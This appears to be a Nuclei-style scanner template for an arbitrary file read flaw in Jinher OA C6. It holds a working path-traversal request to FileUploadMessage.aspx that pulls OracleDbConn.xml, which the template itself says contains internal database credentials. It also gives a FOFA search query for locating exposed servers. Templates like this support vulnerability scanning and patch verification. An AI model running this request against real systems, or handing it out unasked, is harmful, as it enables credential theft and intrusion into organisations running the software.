id: jinher-oa-c6-FileUploadMessage-lfi

info:
  name: 金和 OA c6 FileUploadMessage.aspx - 任意文件读取漏洞
  author: cnaq
  severity: high
  description:
  reference:
    - https://github.com/wy876/POC/blob/main/%E9%87%91%E5%92%8COA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
  metadata:
    veified: true
    tips: OracleDbConn.xml(内网 数据库账号密码)
    fofa-query: body="/jc6/platform/sys/login" || body="JHSoft.Web.AddMenu" || app="金和网络-金和OA" || "JC6金和协同管理平台"
  tags: jinher,lfi,oa

http:
  - raw:
      - |
        GET /C6/JHSoft.WCF/FunctionNew/FileUploadMessage.aspx?filename=../../../C6/JhSoft.Web.Dossier.JG/JhSoft.Web.Dossier.JG/XMLFile/OracleDbConn.xml HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
        Accept: */*
        Connection: Keep-Alive

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        condition: and
        part: body
        words:
          - 'sqlserver'